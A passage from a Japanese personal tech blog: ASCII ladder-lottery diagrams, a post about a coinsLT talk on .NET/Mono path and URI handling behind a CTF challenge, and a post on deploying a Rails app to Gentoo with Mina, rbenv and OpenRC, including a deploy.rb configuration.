<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1 2 3 4 5 6 7 8
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| | | | | |-| |
</span><span class='line'>| | | | | | |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| | |-| |-| |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | | | |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>| | |-| | | |-|
</span><span class='line'>|-| | | |-| | |
</span><span class='line'>| | |-| | |-| |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>| | |-| | | |-|
</span><span class='line'>| | | | | |-| |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>              *
</span><span class='line'>
</span><span class='line'>1 2 3 4 5 6 7 8
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>| | |-| | |-| |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>| | | | | | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| | | |-| | |-|
</span><span class='line'>|-| | | | | | |
</span><span class='line'>| |-| | |-| | |
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| |-| |-| |
</span><span class='line'>|-| | | | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>            *  
</span><span class='line'>
</span><span class='line'>        *      
</span><span class='line'>|-| |-| | | | |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>| |-| |-| |-| |
</span><span class='line'>| | | | | | | |
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| |-| | |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>|-| | | |-| |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| | | | | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| |-| | |-| | |
</span><span class='line'>8 7 6 5 4 3 2 1
</span><span class='line'>
</span><span class='line'>                 *    
</span><span class='line'>|-|  |  |  |  |--|   |
</span><span class='line'>| |  |--|  |--|  |   |
</span><span class='line'>| |--|  |  |  |  |   |
</span><span class='line'>|-|  |  |  |  |  |---|
</span><span class='line'>| |  |  |  |--|  |   |
</span><span class='line'>|-|  |--|  |  |  |---|
</span><span class='line'>| |  |  |--|  |  |   |
</span><span class='line'>| |  |--|  |  |--|   |
</span><span class='line'>| |--|  |  |--|  |   |
</span><span class='line'>|-|  |  |--|  |  |---|
</span><span class='line'>| |  |--|  |  |--|   |
</span><span class='line'>| |--|  |--|  |  |---|
</span><span class='line'>|-|  |--|  |  |--|   |
</span><span class='line'>| |--|  |  |  |  |---|
</span><span class='line'>| |  |  |--|  |--|   |
</span><span class='line'>| |--|  |  |--|  |   |
</span><span class='line'>| |  |  |--|  |  |---|
</span><span class='line'>| |  |--|  |  |--|   |
</span><span class='line'>| |--|  |--|  |  |---|
</span><span class='line'>1 2  3  4  5  6  7   8
</span><span class='line'>
</span><span class='line'>1------------------- 
</span><span class='line'>  | |  |  | | |  |   
</span><span class='line'>2------------------- 
</span><span class='line'> | | |   | | | |     
</span><span class='line'>3------------------- 
</span><span class='line'>  |   |   | | |      
</span><span class='line'>4-------------------*
</span><span class='line'>   |   | |      | |  
</span><span class='line'>5------------------- 
</span><span class='line'>     |      |  | |   
</span><span class='line'>6------------------- 
</span><span class='line'>    |     |  |     | 
</span><span class='line'>7------------------- 
</span><span class='line'>   |  | |  |   |  |  
</span><span class='line'>8------------------- 
</span><span class='line'>
</span><span class='line'> -------------------1
</span><span class='line'> | |   | | |  |  |   
</span><span class='line'> -------------------2
</span><span class='line'>  |  |  |    |  |  | 
</span><span class='line'> -------------------3
</span><span class='line'>   |          |   |  
</span><span class='line'> -------------------4
</span><span class='line'>  |  | |   | | | |   
</span><span class='line'> -------------------5
</span><span class='line'> |  | |   |   | |    
</span><span class='line'>*-------------------6
</span><span class='line'>        |   |  |     
</span><span class='line'> -------------------7
</span><span class='line'> | | | | | |  | | |  
</span><span class='line'> -------------------8
</span><span class='line'>
</span><span class='line'> -------------------1
</span><span class='line'>       |    |      | 
</span><span class='line'>       |    |      | 
</span><span class='line'>*-------------------2
</span><span class='line'>   | |     | | | |   
</span><span class='line'> -------------------3
</span><span class='line'> |    |  |    |    | 
</span><span class='line'> -------------------4
</span><span class='line'>  | |  |  |  |  | |  
</span><span class='line'>  | |  |  |  |  | |  
</span><span class='line'>  | |  |  |  |  | |  
</span><span class='line'>  | |  |  |  |  | |  
</span><span class='line'> -------------------5
</span><span class='line'> |       |  |  | | | 
</span><span class='line'> |       |  |  | | | 
</span><span class='line'> -------------------6
</span><span class='line'>  | | | |  | |  |    
</span><span class='line'> -------------------7
</span><span class='line'> |     | |  |  |     
</span><span class='line'> |     | |  |  |     
</span><span class='line'> -------------------8</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/20/miocat-at-coinslt0/">miocatのその後、あるいはcoinsLT #0で発表した話</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-06-20T11:09:26+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>情報科学類1年が企画した<a href="http://atnd.org/events/51236">coinsLT #0</a>（ATNDの方が情報量が多いのだが、一応<a href="http://coinslt.org/zero.html">Webページ</a>も存在している）で発表した。タイトルがクソ長いが要するにこのブログでいくつか投稿してきた、.NET FrameworkとMonoにおけるGetFullPathとかnew Uriの挙動の違いについてである。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/39806085" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/maytheplic/coinslt0-miocat" title="coinsLT#0 tkbctf3 miocatができるまで" target="_blank">coinsLT#0 tkbctf3 miocatができるまで</a> </strong> from <strong><a href="//www.slideshare.net/maytheplic" target="_blank">Mei Akizuru</a></strong> </div></p>

<p>実際の発表時の動画も公開されている。だいたい07:58あたりからが私の発表である。</p>

<iframe width="560" height="315" src="//www.youtube-nocookie.com/embed/s3_BCaFAVv8" frameborder="0" allowfullscreen></iframe>


<p>「小傘ちゃんかわいい」のところでなぜか拍手が起こったり（これは後で原因がわかった）、ぼちぼち笑いが取れていたように思う。</p>

<p>さて、それはともかくとして実は前に投げたバグレポートに返事がついていて、状態はRESOLVED INVALIDとなっていた。</p>

<p>曰く、「&#8221;<a href="http://test.com">http://test.com</a>&#8221; はUnixでは妥当なファイルパスである。.NETはUnixに対する考慮が足りてないからそういう挙動になるんであって、つまりお前のコードで対処しろ」。</p>

<p>全くの正論であった。そもそもユーザーから与えられた文字列をそのままDownloadStringとかに投げている時点で結構異常なので、ちゃんと入力はチェックしましょう、という結論に至った。</p>

<p>Unixで妥当なら仕方ないね、と私は思ったし、今述べたように事前にチェックすべきだと考えるので私はこのままでいいんじゃないかと思っている。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/05/28/rails-app-with-mina/">Railsアプリ With Mina and OpenRC</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-05-28T00:07:56+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1>目的とか</h1>

<p>KONMAIが送る大人気リズムアクションゲーム&#8221;REFLEC BEAT groovin&#8217;!!&ldquo;に向けてRefixativeの新バージョンを書いていた。今までは毎回毎回サーバーにsshしてはgit pullしてうんぬんかんぬん、とやっていたので、現代的な環境を構築したかった。</p>

<p>ついでに、サーバーを再起動する度にunicornのプロセス周りがなぜだかややこしいことになっていたので、どうせそもそもデーモンなんだからinitスクリプトを書けばいいんじゃね、ということでそっちもついでに対応した。</p>

<p>OpenRCの実装を読み始めた辺りから変な沼にハマって、そこから3日くらいかかった。</p>

<h1>環境その他</h1>

<p>開発環境はMac OS X Mavericks。Homebrewでいろんなものを突っ込んである状態。</p>

<p>サーバーはさくらのVPS(2G)でOSとしてGentoo Linuxがインストールされている。</p>

<p>Rubyのバージョンは2.1.2、Railsのバージョンは4.1.1。</p>

<p>DBにPostgreSQL 9.3を使用。現時点ではまだ用意していないが、memcachedも使用する予定。</p>

<h1>Rails</h1>

<p><code>rails new</code>して適当にGemfileを弄って<code>bundle install --path vendor/bundle</code>。</p>

<h2>rbenv on Gentoo</h2>

<p>まず第一関門がRubyだった。Gentoo上でrbenvやRVMを使ってRubyをインストールすると、<code>auto_gem</code>なるライブラリがないと言われてRubyが動かないという問題に遭遇した。ググってみると同じ問題に遭遇している人が多数いた。<code>RUBYOPT</code>を空にして<code>rubygems</code>をemergeしなおせばいいよ、とかまぁいろいろ見つかったのだけど、そもそも<code>auto_gem</code>というのが気になり、Twitterでいろいろ叫びながら調べていたところ、Gentooのこわいひとに教えてもらうことができた。</p>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/maytheplic">@maytheplic</a> dev-ruby/rubygemsがインストールしていて、加古にruby18にgems読ませるためにいれていた。いまはいらない。ruby18もそのうちおちるしその時におとしてくれようって言おうと思う</p>&mdash; 春はGentooインストールの季節 (@naota344) <a href="https://twitter.com/naota344/statuses/469521948465053696">2014, 5月 22</a></blockquote>


<p>（ちなみにその後Gentooのこわいひとが次のように仰っていたので、きっとこの問題は起こらなくなるだろう）</p>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/maytheplic">@maytheplic</a> いまgentoo ruby teamとIRCしたらruby18はもうおとつつあるしけしていいね、って話になったし3日ぐらいしたらそのあたりもきえちゃうんじゃないかな</p>&mdash; 春はGentooインストールの季節 (@naota344) <a href="https://twitter.com/naota344/statuses/469523144915427330">2014, 5月 22</a></blockquote>


<p>さて、それはともかくとして、少なくともこれをやってた時点では直ってなかったので対策をしなければならない。</p>

<p>そもそも<code>auto_gem.rb</code>とやらが何をしているのかというと、</p>

<ul>
<li><code>require 'rubygems'</code>する</li>
<li>そのときに<code>LoadError</code>が起きたら握り潰す</li>
</ul>


<p>以上である。Gentooのこわいひとの言う通り、見事に現代には不要なブツである。不要なのだから、現代的なRuby環境では「何もしなくてもよい」ということができる。というわけで、適当に<code>site_ruby</code>辺りに空の<code>auto_gem.rb</code>を突っ込んでしまえばよい。例えばRuby 2.1.2であれば、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>touch $HOME/.rbenv/versions/2.1.2/lib/ruby/site_ruby/2.1.0/auto_gem.rb</span></code></pre></td></tr></table></div></figure>


<p>とかやると動くようになる。</p>

<p>ちなみにruby-buildを使っている場合はインストール後にそれを自動でやってくれるpluginがある。 -> <a href="https://github.com/Cofyc/rbenv-auto_gem">Cofyc/rbenv-auto_gem</a></p>

<p>これを<code>$HOME/.rbenv/plugins</code>の下にcloneして<code>rbenv install ...</code>とかやると適切な場所に空の<code>auto_gem.rb</code>を作ってくれる。</p>

<p>これでRubyが動くようになった。</p>

<h2>therubyracer</h2>

<p><code>rake assets:precompile</code>をしたとき、ローカルでは上手くいくのに、サーバー側ではSegmentation FaultでRubyが落ちるという事態に遭遇した。吐かれたエラーを見るとtherubyracerがどうの、といったところで落ちていた。サーバー側にはnode.jsが入っているし、特に問題ないだろうと判断してGemfileからtherubyracerを消したところ上手く動作した。なんだったんだろう。</p>

<h1>Mina</h1>

<p><a href="http://nadarei.co/mina/">Mina</a>はデプロイ自動化ツールで、同じようなツールで最も有名なのは恐らく<a href="http://capistranorb.com">Capistrano</a>だろう。</p>

<p>今までRefixativeのデプロイというのはHerokuのように<code>git push</code>したら行われるとかなんかのbotにコマンド投げると行われるとかでは全くなく、開発者自身（つまり私）がデプロイ先サーバーにsshして、アプリケーションが置いてあるフォルダに移動して、git pullして、unicornをreloadして……とやっていた。正直アホらしい。</p>

<p>そういうわけでその辺自動化するためにCapistranoでも触るか……と思っていたところで某筑波のておくれからこんなreplyが来た。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/maytheplic">@maytheplic</a> minaがナウいらしい <a href="http://t.co/MDwGLIx7Y0">http://t.co/MDwGLIx7Y0</a></p>&mdash; まてぃー (@rkmathi) <a href="https://twitter.com/rkmathi/statuses/459561993729347587">2014, 4月 25</a></blockquote>


<p>ナウいらしい。ならば使うしかあるまい。というわけでMina採用となった。</p>

<h2>その前に</h2>

<p>サーバー側でRailsアプリを動かすユーザー等々を準備しておく。</p>

<p>まずユーザー（今回は<code>refxgroovin</code>）を予め作成しておく。デプロイ先はこのユーザーのホームディレクトリ以下とし、今回は<code>/home/refxgroovin/refixative</code>としている。ステージング環境も同じユーザーで動かし、そちらのデプロイ先は<code>refixative-staging</code>とした。</p>

<p>開発環境からサーバーに対してrefxgroovinとしてsshでログインできるように設定する。開発環境で公開鍵・秘密鍵のペアを作成し、サーバー側の<code>/home/refxgroovin/.ssh/authorized_keys</code>に公開鍵を追記する。</p>

<p>ソースコードを取得する元になるリポジトリだが、今回github上にあるpublicなリポジトリなので実際どっちでもよさそうだし、SSH Agentを使うこともできるが、今回はさらにサーバー上のrefxgroovinユーザーでSSHの鍵を生成してリポジトリにアクセスできるように設定する。</p>

<h2>Minaの準備</h2>

<p>まずはGemfileに<code>gem 'mina'</code>の一行を追加して<code>bundle</code>した後、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bundle exec mina init</span></code></pre></td></tr></table></div></figure>


<p>とすると、<code>config/deploy.rb</code>というファイルが出来るのでこれを編集する。以下に示す<code>deploy.rb</code>はデフォルトを元にいろいろ試行錯誤した結果である。</p>

<figure class='code'><figcaption><span>deploy.rb (refxgroovin_deploy.rb)</span> <a href='/downloads/code/refxgroovin_deploy.rb'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="nb">require</span> <span class="s1">&#39;mina/bundler&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;mina/rails&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;mina/git&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;mina/rbenv&#39;</span>  <span class="c1"># for rbenv support. (http://rbenv.org)</span>
</span><span class='line'><span class="c1"># require &#39;mina/rvm&#39;    # for rvm support. (http://rvm.io)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Optional settings:</span>
</span><span class='line'><span class="c1">#   set :user, &#39;foobar&#39;    # Username in the server to SSH to.</span>
</span><span class='line'><span class="c1">#   set :port, &#39;30000&#39;     # SSH port number.</span>
</span><span class='line'>
</span><span class='line'><span class="n">set</span> <span class="ss">:user</span><span class="p">,</span> <span class="s1">&#39;refxgroovin&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Basic settings:</span>
</span><span class='line'><span class="c1">#   domain       - The hostname to SSH to.</span>
</span><span class='line'><span class="c1">#   deploy_to    - Path to deploy into.</span>
</span><span class='line'><span class="c1">#   repository   - Git repo to clone from. (needed by mina/git)</span>
</span><span class='line'><span class="c1">#   branch       - Branch name to deploy. (needed by mina/git)</span>
</span><span class='line'>
</span><span class='line'><span class="n">set</span> <span class="ss">:domain</span><span class="p">,</span> <span class="s1">&#39;refxgroovin&#39;</span>
</span><span class='line'><span class="n">set</span> <span class="ss">:repository</span><span class="p">,</span> <span class="s1">&#39;git@github.com:mayth/refixative.git&#39;</span>
</span><span class='line'><span class="n">set</span> <span class="ss">:branch</span><span class="p">,</span> <span class="s1">&#39;next&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Manually create these paths in shared/ (eg: shared/config/database.yml) in your server.</span>
</span><span class='line'><span class="c1"># They will be linked in the &#39;deploy:link_shared_paths&#39; step.</span>
</span><span class='line'><span class="n">set</span> <span class="ss">:shared_paths</span><span class="p">,</span> <span class="o">[</span>
</span><span class='line'>  <span class="s1">&#39;config/database.yml&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;config/unicorn.rb&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;config/application.yml&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;log&#39;</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># This task is the environment that is loaded for most commands, such as</span>
</span><span class='line'><span class="c1"># `mina deploy` or `mina rake`.</span>
</span><span class='line'><span class="n">task</span> <span class="ss">:environment</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">case</span> <span class="no">ENV</span><span class="o">[</span><span class="s1">&#39;to&#39;</span><span class="o">]</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;staging&#39;</span>
</span><span class='line'>    <span class="n">set</span> <span class="ss">:deploy_to</span><span class="p">,</span> <span class="s2">&quot;/home/</span><span class="si">#{</span><span class="n">user</span><span class="si">}</span><span class="s2">/refixative-staging&quot;</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;production&#39;</span>
</span><span class='line'>    <span class="n">set</span> <span class="ss">:deploy_to</span><span class="p">,</span> <span class="s2">&quot;/home/</span><span class="si">#{</span><span class="n">user</span><span class="si">}</span><span class="s2">/refixative&quot;</span>
</span><span class='line'>  <span class="k">when</span> <span class="kp">nil</span>
</span><span class='line'>    <span class="nb">fail</span> <span class="s1">&#39;specify `to`, deployment target&#39;</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="nb">fail</span> <span class="s1">&#39;unknown deployment target&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1"># If you&#39;re using rbenv, use this to load the rbenv environment.</span>
</span><span class='line'>  <span class="c1"># Be sure to commit your .rbenv-version to your repository.</span>
</span><span class='line'>  <span class="n">invoke</span> <span class="ss">:&#39;rbenv:load&#39;</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Put any custom mkdir&#39;s in here for when `mina setup` is ran.</span>
</span><span class='line'><span class="c1"># For Rails apps, we&#39;ll make some of the shared paths that are shared between</span>
</span><span class='line'><span class="c1"># all releases.</span>
</span><span class='line'><span class="n">task</span> <span class="ss">:setup</span> <span class="o">=&gt;</span> <span class="ss">:environment</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[mkdir -p &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/log&quot;]</span>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[chmod g+rx,u+rwx &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/log&quot;]</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[mkdir -p &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/config&quot;]</span>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[chmod g+rx,u+rwx &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/config&quot;]</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[mkdir -p &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/pids&quot;]</span>
</span><span class='line'>  <span class="n">queue!</span> <span class="sx">%[chmod g+rx,u+rwx &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/pids&quot;]</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">shared_configs</span> <span class="o">=</span> <span class="sx">%w(database.yml unicorn.rb application.yml)</span>
</span><span class='line'>  <span class="n">shared_configs</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">conf</span><span class="o">|</span>
</span><span class='line'>    <span class="n">queue!</span> <span class="sx">%[touch &quot;</span><span class="si">#{</span><span class="n">deploy_to</span><span class="si">}</span><span class="sx">/shared/config/</span><span class="si">#{</span><span class="n">conf</span><span class="si">}</span><span class="sx">&quot;]</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="n">queue</span>  <span class="sx">%[echo &quot;-----&gt; Be sure to edit the following files in &#39;shared/config&#39;:&quot;]</span>
</span><span class='line'>  <span class="n">shared_configs</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">conf</span><span class="o">|</span>
</span><span class='line'>    <span class="n">queue</span>  <span class="sx">%[echo &quot;-----&gt;   * </span><span class="si">#{</span><span class="n">conf</span><span class="si">}</span><span class="sx">&quot;]</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">desc</span> <span class="s2">&quot;Deploys the current version to the server.&quot;</span>
</span><span class='line'><span class="n">task</span> <span class="ss">:deploy</span> <span class="o">=&gt;</span> <span class="ss">:environment</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">deploy</span> <span class="k">do</span>
</span><span class='line'>    <span class="c1"># Put things that will set up an empty directory into a fully set-up</span>
</span><span class='line'>    <span class="c1"># instance of your project.</span>
</span><span class='line'>    <span class="n">invoke</span> <span class="ss">:&#39;git:clone&#39;</span>
</span><span class='line'>    <span class="n">invoke</span> <span class="ss">:&#39;deploy:link_shared_paths&#39;</span>
</span><span class='line'>    <span class="n">invoke</span> <span class="ss">:&#39;bundle:install&#39;</span>
</span><span class='line'>    <span class="n">invoke</span> <span class="ss">:&#39;rails:db_migrate&#39;</span>
</span><span class='line'>    <span class="n">invoke</span> <span class="ss">:&#39;rails:assets_precompile&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">to</span> <span class="ss">:launch</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">env</span> <span class="o">=</span> <span class="no">ENV</span><span class="o">[</span><span class="s1">&#39;to&#39;</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;production&#39;</span> <span class="p">?</span> <span class="s1">&#39;&#39;</span> <span class="p">:</span> <span class="s2">&quot;.</span><span class="si">#{</span><span class="no">ENV</span><span class="o">[</span><span class="s1">&#39;to&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="no">ENV</span><span class="o">[</span><span class="s1">&#39;reload&#39;</span><span class="o">]</span> <span class="o">||</span> <span class="s1">&#39;reload&#39;</span>
</span><span class='line'>      <span class="n">queue</span> <span class="sx">%[sudo /etc/init.d/refxgroovin</span><span class="si">#{</span><span class="n">env</span><span class="si">}</span><span class="sx"> </span><span class="si">#{</span><span class="n">cmd</span><span class="si">}</span><span class="sx">]</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># For help in making your deploy script, see the Mina documentation:</span>
</span><span class='line'><span class="c1">#</span>
</span><span class='line'><span class="c1">#  - http://nadarei.co/mina</span>
